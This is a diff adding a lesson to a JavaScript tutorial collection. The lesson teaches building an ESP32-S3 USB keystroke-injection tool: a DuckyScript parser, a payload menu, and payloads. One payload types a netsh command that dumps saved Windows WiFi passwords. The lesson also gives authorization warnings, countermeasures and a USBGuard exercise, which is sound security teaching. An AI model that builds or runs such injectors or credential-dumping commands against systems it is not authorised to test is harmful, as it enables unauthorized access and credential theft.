@@ -223,4 +223,159 @@ window.SignalGuides = {
         ]
     }
 
+},
+
+    // ========================================================================
+    // SG-94: USB Keystroke Injection — Advanced Payloads
+    // ========================================================================
+    'sg-94': {
+        intro: '<p>In SG-93 you made the ESP32-S3 type a simple message. Now you will build a full keystroke injection framework &mdash; a DuckyScript-compatible payload engine that reads scripts from the flash filesystem, displays a selection menu on the TFT, and executes multi-step command sequences on the target machine.</p>' +
+               '<p>This is how professional USB security assessment tools work. Understanding the technique is essential for building detection systems that protect against it.</p>' +
+               '<p>You will create three safe demonstration payloads: a system information collector, a text file creator, and a WiFi password extractor (displays saved WiFi passwords on Windows). All payloads are educational and reversible.</p>',
+
+        wiring: '    No external wiring required.\n    Same T-Display-S3 board from SG-93.\n    USB-C connection to target machine.',
+
+        wiringNotes: '<p><strong>No external wiring.</strong> Same board as SG-93.</p>' +
+                     '<p><strong>Authorization:</strong> USB keystroke injection is a penetration testing technique. Only use on systems you own or have explicit written permission to test. Unauthorized use may violate computer fraud laws.</p>' +
+                     '<p><strong>Safety:</strong> Always review your payload before execution. A typo in a command sequence could delete files, change settings, or lock accounts. Test on a virtual machine first.</p>',
+
+        wiringSvg: '<div class="svg-build-wrap">' +
+            '<svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
+            '<defs><pattern id="sg94-grid" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
+            '<rect width="680" height="200" fill="#0d1117" rx="8"/>' +
+            '<rect x="10" y="10" width="660" height="180" fill="url(#sg94-grid)" rx="4"/>' +
+            '<text x="340" y="28" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-94 USB KEYSTROKE INJECTION FLOW</text>' +
+            '<!-- S3 Board -->' +
+            '<rect x="40" y="60" width="160" height="100" rx="8" fill="#1e2736" stroke="#a855f7" stroke-width="1.5"/>' +
+            '<text x="120" y="85" text-anchor="middle" fill="#c084fc" font-size="9" font-weight="700">T-Display-S3</text>' +
+            '<text x="120" y="100" text-anchor="middle" fill="#8b949e" font-size="7">Payload stored</text>' +
+            '<text x="120" y="114" text-anchor="middle" fill="#8b949e" font-size="7">in SPIFFS flash</text>' +
+            '<rect x="60" y="125" width="120" height="20" rx="3" fill="rgba(239,68,68,0.1)" stroke="#ef4444" stroke-width="0.5"/>' +
+            '<text x="120" y="139" text-anchor="middle" fill="#ef4444" font-size="7" font-weight="600">SELECT PAYLOAD</text>' +
+            '<!-- Arrow -->' +
+            '<line x1="210" y1="110" x2="300" y2="110" stroke="#eab308" stroke-width="2"/>' +
+            '<polygon points="295,106 305,110 295,114" fill="#eab308"/>' +
+            '<text x="255" y="100" text-anchor="middle" fill="#eab308" font-size="7">USB HID</text>' +
+            '<text x="255" y="125" text-anchor="middle" fill="#555" font-size="6">Keystrokes at</text>' +
+            '<text x="255" y="135" text-anchor="middle" fill="#555" font-size="6">machine speed</text>' +
+            '<!-- Target -->' +
+            '<rect x="310" y="60" width="160" height="100" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
+            '<text x="390" y="85" text-anchor="middle" fill="#60a5fa" font-size="9" font-weight="700">TARGET PC</text>' +
+            '<text x="390" y="100" text-anchor="middle" fill="#8b949e" font-size="7">Sees a USB keyboard</text>' +
+            '<text x="390" y="114" text-anchor="middle" fill="#8b949e" font-size="7">Trusts input implicitly</text>' +
+            '<text x="390" y="132" text-anchor="middle" fill="#ef4444" font-size="7">Commands execute as</text>' +
+            '<text x="390" y="146" text-anchor="middle" fill="#ef4444" font-size="7">logged-in user</text>' +
+            '<!-- Defense box -->' +
+            '<rect x="500" y="60" width="160" height="100" rx="8" fill="rgba(34,197,94,0.06)" stroke="#22c55e" stroke-width="1.5"/>' +
+            '<text x="580" y="85" text-anchor="middle" fill="#22c55e" font-size="9" font-weight="700">DEFENSE</text>' +
+            '<text x="580" y="104" text-anchor="middle" fill="#8b949e" font-size="6.5">USB device policies</text>' +
+            '<text x="580" y="118" text-anchor="middle" fill="#8b949e" font-size="6.5">HID keystroke timing</text>' +
+            '<text x="580" y="132" text-anchor="middle" fill="#8b949e" font-size="6.5">USB port lockdown</text>' +
+            '<text x="580" y="146" text-anchor="middle" fill="#8b949e" font-size="6.5">Endpoint detection</text>' +
+            '</svg></div>',
+
+        steps: [
+            {
+                title: 'Build the Payload Engine',
+                content: '<p>Create a DuckyScript-compatible parser that reads payload files from SPIFFS (the ESP32-S3 flash filesystem). Each payload is a text file with simple commands: STRING (type text), DELAY (wait), GUI (Windows key), ENTER, etc.</p>',
+                code: '#include <TFT_eSPI.h>\n#include "USB.h"\n#include "USBHIDKeyboard.h"\n#include <SPIFFS.h>\n\nTFT_eSPI tft = TFT_eSPI();\nUSBHIDKeyboard Keyboard;\n\n// DuckyScript command processor\nvoid processLine(String line) {\n    line.trim();\n    if (line.length() == 0 || line.startsWith("REM")) return;\n    \n    if (line.startsWith("STRING ")) {\n        Keyboard.print(line.substring(7));\n    }\n    else if (line == "ENTER") {\n        Keyboard.press(KEY_RETURN);\n        Keyboard.releaseAll();\n    }\n    else if (line.startsWith("DELAY ")) {\n        delay(line.substring(6).toInt());\n    }\n    else if (line == "GUI r" || line == "WINDOWS r") {\n        Keyboard.press(KEY_LEFT_GUI);\n        Keyboard.press(\'r\');\n        Keyboard.releaseAll();\n    }\n    else if (line == "GUI") {\n        Keyboard.press(KEY_LEFT_GUI);\n        Keyboard.releaseAll();\n    }\n    else if (line == "CTRL ALT t") {\n        Keyboard.press(KEY_LEFT_CTRL);\n        Keyboard.press(KEY_LEFT_ALT);\n        Keyboard.press(\'t\');\n        Keyboard.releaseAll();\n    }\n    else if (line == "ALT F4") {\n        Keyboard.press(KEY_LEFT_ALT);\n        Keyboard.press(KEY_F4);\n        Keyboard.releaseAll();\n    }\n    else if (line == "TAB") {\n        Keyboard.press(KEY_TAB);\n        Keyboard.releaseAll();\n    }\n    else if (line == "ESCAPE") {\n        Keyboard.press(KEY_ESC);\n        Keyboard.releaseAll();\n    }\n    delay(50);  // Brief pause between commands\n}',
+                language: 'C++',
+                tip: '<strong>DuckyScript</strong> is the scripting language used by the USB Rubber Ducky. It is simple and widely documented. By making your engine compatible, you can use thousands of existing payloads from the security community (after reviewing them for safety).'
+            },
+            {
+                title: 'Create Safe Demonstration Payloads',
+                content: '<p>Store payload files on SPIFFS. These three payloads are safe, educational, and reversible:</p>',
+                code: '// payload1.txt — System Info (Windows)\n// Saves to: sysinfo.txt on Desktop\nREM System Information Collector\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /c systeminfo > %USERPROFILE%\\Desktop\\sysinfo.txt\nENTER\nDELAY 2000\nREM File created on Desktop\n\n// payload2.txt — Create Evidence File\nREM Creates a text file proving USB access\nDELAY 1000\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 1000\nSTRING USB Security Assessment\nENTER\nSTRING This file was created by an authorized USB device.\nENTER\nSTRING Timestamp: \nENTER\nSTRING If you see this file, USB HID devices are not blocked.\nENTER\n\n// payload3.txt — WiFi Passwords (Windows)\nREM Extract saved WiFi passwords\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /c netsh wlan show profiles | findstr "All User" > %USERPROFILE%\\Desktop\\wifi_audit.txt & for /f "tokens=4 delims=:" %a in (\'netsh wlan show profiles ^| findstr "All User"\') do @(netsh wlan show profile name=%a key=clear | findstr "Key Content" >> %USERPROFILE%\\Desktop\\wifi_audit.txt)\nENTER',
+                language: 'DuckyScript',
+                tip: '<strong>Payload 3 extracts saved WiFi passwords on Windows.</strong> This is a common penetration testing technique &mdash; saved WiFi credentials are stored in plaintext by Windows and accessible to any user. The defense is to use WPA2-Enterprise with certificate-based auth instead of PSK.'
+            },
+            {
+                title: 'Build the Display Menu',
+                content: '<p>The TFT shows a list of available payloads. BOOT button scrolls, USER button executes. The display updates with execution status in real time.</p>',
+                code: 'struct Payload {\n    const char* name;\n    const char* description;\n    const char* filename;\n};\n\nPayload payloads[] = {\n    {"SysInfo Dump", "Collect system info", "/payload1.txt"},\n    {"Evidence File", "Create proof of access", "/payload2.txt"},\n    {"WiFi Audit", "Extract saved WiFi keys", "/payload3.txt"}\n};\nconst int NUM_PAYLOADS = 3;\nint selected = 0;\n\nvoid drawPayloadMenu() {\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(0xF800, TFT_BLACK);  // Red\n    tft.setTextSize(2);\n    tft.setCursor(10, 5);\n    tft.println("USB INJECTOR");\n    \n    tft.setTextSize(1);\n    for (int i = 0; i < NUM_PAYLOADS; i++) {\n        tft.setCursor(10, 40 + i * 25);\n        if (i == selected) {\n            tft.setTextColor(TFT_BLACK, TFT_CYAN);\n        } else {\n            tft.setTextColor(TFT_WHITE, TFT_BLACK);\n        }\n        tft.print(" ");\n        tft.print(payloads[i].name);\n        tft.print(" ");\n        \n        tft.setTextColor(TFT_DARKGREY, TFT_BLACK);\n        tft.setCursor(10, 40 + i * 25 + 12);\n        tft.println(payloads[i].description);\n    }\n    \n    tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n    tft.setCursor(10, 130);\n    tft.println("BOOT=scroll  USER=execute");\n}\n\nvoid executePayload(int idx) {\n    tft.setTextColor(TFT_RED, TFT_BLACK);\n    tft.setCursor(10, 145);\n    tft.println("INJECTING...");\n    \n    File f = SPIFFS.open(payloads[idx].filename, "r");\n    if (!f) {\n        tft.println("ERROR: File not found");\n        return;\n    }\n    \n    int lineNum = 0;\n    while (f.available()) {\n        String line = f.readStringUntil(\'\\n\');\n        processLine(line);\n        lineNum++;\n        \n        // Update progress on display\n        tft.fillRect(10, 145, 300, 10, TFT_BLACK);\n        tft.setCursor(10, 145);\n        tft.printf("Line %d processed", lineNum);\n    }\n    f.close();\n    \n    tft.fillRect(10, 145, 300, 10, TFT_BLACK);\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.setCursor(10, 145);\n    tft.println("COMPLETE");\n}',
+                language: 'C++',
+                tip: null
+            },
+            {
+                title: 'Add Execution Delay and Safety Confirmation',
+                content: '<p>Add a configurable delay before execution begins (default: 3 seconds). This gives the operator time to cancel if the wrong system is targeted. The display shows a countdown.</p>',
+                code: 'void executeWithCountdown(int idx, int delaySec) {\n    for (int i = delaySec; i > 0; i--) {\n        tft.fillRect(10, 145, 300, 15, TFT_BLACK);\n        tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n        tft.setCursor(10, 145);\n        tft.printf("Executing in %d... (BOOT=cancel)", i);\n        \n        // Check for cancel\n        for (int ms = 0; ms < 1000; ms += 50) {\n            if (digitalRead(BTN_BOOT) == LOW) {\n                tft.fillRect(10, 145, 300, 15, TFT_BLACK);\n                tft.setTextColor(0x07E0, TFT_BLACK);\n                tft.setCursor(10, 145);\n                tft.println("CANCELLED");\n                delay(1000);\n                drawPayloadMenu();\n                return;\n            }\n            delay(50);\n        }\n    }\n    executePayload(idx);\n}',
+                language: 'C++',
+                tip: '<strong>The cancel window is critical.</strong> Professional tools always have an abort mechanism. In a real assessment, the operator needs to verify they are plugged into the correct target before the payload fires. Without a cancel, a misplaced device could execute on the wrong machine.'
+            },
+            {
+                title: 'Detection and Defense Discussion',
+                content: '<p>Every technique you build should be paired with its defense. USB keystroke injection can be detected and prevented:</p>' +
+                         '<ul>' +
+                         '<li><strong>USB Device Policies (GPO):</strong> Windows Group Policy can restrict which USB devices are allowed. Whitelist only approved keyboard VIDs/PIDs.</li>' +
+                         '<li><strong>Keystroke Timing Analysis:</strong> Humans type 40-80 WPM with variable delays. USB injectors type at 1000+ WPM with uniform timing. EDR agents can detect this pattern.</li>' +
+                         '<li><strong>USB Port Lockdown:</strong> Physical port locks or epoxy in unused USB ports. Simple but effective.</li>' +
+                         '<li><strong>New Device Alerts:</strong> Configure the OS to alert when a new HID device is connected. On Linux: udev rules. On Windows: Group Policy or third-party tools.</li>' +
+                         '<li><strong>USB Firewall:</strong> Tools like USBGuard (Linux) or commercial USB security products that prompt before allowing new devices.</li>' +
+                         '</ul>',
+                code: null,
+                language: null,
+                tip: '<strong>The lesson:</strong> USB HID trust is a design flaw in the USB specification itself. Every OS trusts HID devices by default because the spec was designed in an era when all USB devices were trusted peripherals. Modern security requires treating USB ports as untrusted network interfaces.'
+            }
+        ],
+
+        testing: '<p>Verify the complete workflow:</p>' +
+                 '<ul>' +
+                 '<li><strong>SPIFFS:</strong> Upload the payload files to SPIFFS using PlatformIO filesystem upload. Verify they appear in the file list on the display.</li>' +
+                 '<li><strong>Menu navigation:</strong> BOOT button cycles through payloads, display highlights the selected item.</li>' +
+                 '<li><strong>Countdown:</strong> After pressing USER, the 3-second countdown appears with cancel option.</li>' +
+                 '<li><strong>Payload 1 (SysInfo):</strong> A sysinfo.txt file appears on the target Desktop.</li>' +
+                 '<li><strong>Payload 2 (Evidence):</strong> Notepad opens with the assessment text.</li>' +
+                 '<li><strong>Payload 3 (WiFi):</strong> A wifi_audit.txt file appears with saved network names and keys.</li>' +
+                 '<li><strong>Cancel:</strong> Pressing BOOT during countdown stops execution.</li>' +
+                 '</ul>',
+
+        troubleshooting: '<ul>' +
+                         '<li><strong>SPIFFS upload fails:</strong> Use PlatformIO: Upload Filesystem Image (not regular Upload). Create a <code>data/</code> folder in your project root and put payload .txt files there.</li>' +
+                         '<li><strong>Payload types wrong characters:</strong> USB HID uses US keyboard layout. If the target uses a different layout, characters like @, #, \\, / may map incorrectly. Test on the same layout as the target.</li>' +
+                         '<li><strong>GUI+R does not open Run dialog:</strong> The target may have Windows key disabled via Group Policy, or the user may not have Run dialog enabled. This is actually a defense working correctly.</li>' +
+                         '<li><strong>WiFi payload returns empty:</strong> The target may use 802.1X enterprise WiFi which does not store PSK passwords locally. Or the user account may not have admin privileges to read key content.</li>' +
+                         '<li><strong>Commands execute too fast:</strong> Increase DELAY values in payloads. Some applications (Notepad, cmd) take longer to open on slower machines.</li>' +
+                         '</ul>',
+
+        challenges: '<p><strong>Challenge 1: Multi-OS Payload</strong> &mdash; Create a payload that detects the target OS (Windows vs macOS vs Linux) by trying key combinations and observing timing, then branches to the correct command sequence for that OS.</p>' +
+                    '<p><strong>Challenge 2: Exfiltration via WiFi</strong> &mdash; Instead of saving files to the Desktop, have the payload POST collected data to a web server running on the ESP32-S3 itself (using its WiFi AP mode). The data never touches the target filesystem.</p>' +
+                    '<p><strong>Challenge 3: Build USBGuard Rules</strong> &mdash; On a Linux machine, install USBGuard and write rules that would block this device. Then test whether your rules actually prevent the payload from executing. Document the detection vs evasion game.</p>',
+
+        stepVisuals: {},
+
+        componentCallouts: {
+            svg: '',
+            components: [
+                {
+                    id: 't-display-s3',
+                    name: 'LILYGO T-Display-S3 (from SG-93)',
+                    purpose: 'Same board as SG-93. The native USB OTG presents as a USB HID keyboard to the target computer. The TFT display shows payload selection and execution status. SPIFFS flash stores payload scripts.',
+                    specs: ['USB HID Class 0x03', 'SPIFFS: ~4MB usable', 'DuckyScript compatible', 'Button-triggered execution']
+                }
+            ]
+        },
+
+        commonMistakes: [
+            {
+                title: 'Executing Payloads Without Reading Them First',
+                correct: 'Read every line of a payload before executing it. Understand what each command does. Run on a VM first. Only then run on real hardware.',
+                incorrect: 'Downloading a payload from the internet and running it without review. DuckyScript payloads can contain destructive commands (format, delete, exfiltrate).',
+                consequence: 'The payload runs commands you did not expect. Files get deleted, settings get changed, or data gets sent to an unknown server. You cannot undo keystrokes once typed.'
+            },
+            {
+                title: 'No Execution Delay or Cancel Mechanism',
+                correct: 'Always include a countdown with cancel option before payload execution. 3-5 seconds minimum. The operator must have time to verify they are on the right target.',
+                incorrect: 'Payload begins typing immediately on boot or button press with no way to abort.',
+                consequence: 'If the board is plugged into the wrong machine (instructor laptop, production server, another student machine), the payload executes before anyone can stop it.'
+            },
+            {
+                title: 'Leaving the Board Plugged In After Testing',
+                correct: 'Unplug the board immediately after testing. Store it in a labeled container. Never leave it connected to any machine unattended.',
+                incorrect: 'Leaving the board plugged into a USB port after testing. It continues to present as a keyboard and could be accidentally triggered.',
+                consequence: 'Someone bumps the button, or a reboot triggers the boot sequence, and the payload fires again on an unmonitored machine.'
+            }
+        ]
+    }
+
 };
